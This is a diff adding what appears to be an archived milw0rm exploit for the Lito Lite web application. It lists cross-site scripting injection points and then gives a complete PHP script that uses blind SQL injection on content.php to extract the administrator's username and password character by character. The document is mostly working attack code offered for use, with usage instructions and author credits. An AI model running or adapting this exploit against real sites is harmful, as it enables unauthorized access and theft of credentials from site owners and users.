@@ -1,0 +1,90 @@
+#--+++===================================================================================+++--#
+#--+++====== Lito Lite Multiple Cross Site Scripting / Blind SQL Injection Exploit ======+++--#
+#--+++===================================================================================+++--#
+
+[+] XSS
+[+] comments.php?id=>[js code]
+[+] postcomment.php?id=>[js code]
+
+#!/usr/bin/php
+<?
+
+function query ($fld, $pos, $ord)
+{
+	$sql = "x' OR ASCII(SUBSTRING((SELECT {$fld} FROM mx_user WHERE uid = 1),{$pos},1))={$ord} OR '1' = '2";
+	$sql = str_replace (" ", "%20", $sql);
+	$sql = str_replace ("'", "%27", $sql);
+	return $sql;
+}
+function check ($host, $path, $fld, $pos, $char)
+{
+	$fp = fsockopen ($host, 80);
+	$char = ord ($char);
+
+	$query = query ($fld, $pos, $char);
+
+	$req =  "GET {$path}/content.php?id={$query} HTTP1.1\r\n".
+		"Host: {$host}\r\n".
+		"Connection: Close\r\n\r\n";
+
+	fputs ($fp, $req);
+
+	while (!feof ($fp))
+		$cont .= trim (fgets ($fp, 1024));
+
+	fclose ($fp);
+
+	$x = array ();
+
+	preg_match ("/<div id=\"wrapper\">(.+?)div>/", $cont, $x);
+
+	if (strlen ($x [1]) == 2)
+		return false;
+	else
+		return true;
+}
+
+function brute ($host, $path, $fld, $key)
+{
+	$pos = 1;
+	$chr = 0;
+	while ($chr < strlen ($key))
+	{
+		if (check ($host, $path, $fld, $pos, $key [$chr]))
+		{
+			$res .= $key [$chr];
+			$chr = -1;
+			$pos++;
+		}
+		$chr++;
+	}
+	return $res;
+}
+
+function usage ()
+{
+	echo "[+] Lito Lite Blind SQL Injection Exploit\n".
+	     "[+] Author: darkjoker ~ http://darkjokerside.altervista.org ~ darkjoker93[at]gmail[dot]com\n".
+	     "[+] Usage: php " . $argv [0] . " <hostname> <path> [key]\n".
+	     "[+] Ex. php ". $argv [0] . " localhost /lito_lite abcdefghijklmnopqrstuvwxyz0123456789\n".
+	     "[+] Greetz to athos, marco6\n";
+	exit ();
+}
+
+
+if (count ($argv) < 3)
+	usage ();
+
+$host = $argv [1];
+$path = $argv [2];
+if (empty ($argv [3]))
+	$key = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+else
+	$key = $argv [3];
+
+echo "[+] Username: " . brute ($host, $path, "username", $key) . "\n".
+     "[+] Password: " . brute ($host, $path, "password", $key) . "\n";
+
+?>
+
+# milw0rm.com [2009-01-03]
